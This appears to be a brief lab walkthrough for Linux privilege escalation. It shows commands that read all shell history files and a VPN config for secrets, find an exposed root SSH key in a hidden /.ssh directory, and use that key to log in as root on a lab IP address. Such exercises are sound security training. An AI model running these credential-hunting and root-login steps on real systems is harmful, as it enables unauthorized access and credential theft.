# Passwords & Keys

## History Files

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

## Config Files

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a **myvpn.ovpn** config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

## SSH Keys

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

`ls -l /.ssh`

Give it the correct permissions,

`chmod 600 root_key`

`ssh -i root_key root@10.10.82.45`
